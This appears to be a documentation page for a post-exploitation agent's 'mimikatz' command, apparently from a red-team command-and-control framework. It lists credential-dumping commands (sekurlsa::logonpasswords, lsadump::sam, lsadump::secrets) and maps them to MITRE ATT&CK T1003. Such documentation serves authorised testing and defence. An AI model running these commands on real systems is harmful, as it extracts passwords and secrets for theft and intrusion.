+++
title = "mimikatz"
chapter = false
weight = 103
hidden = false
+++

## Summary
Execute Mimikatz commands. Mimikatz must first be registered with the agent using `register_assembly` or uploaded as a DLL.

### Arguments

#### args
The Mimikatz command string to execute (e.g., `sekurlsa::logonpasswords`).

## Usage
```
mimikatz <args>
```

Example
```
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam
mimikatz token::elevate lsadump::secrets
```

## MITRE ATT&CK Mapping

- T1003
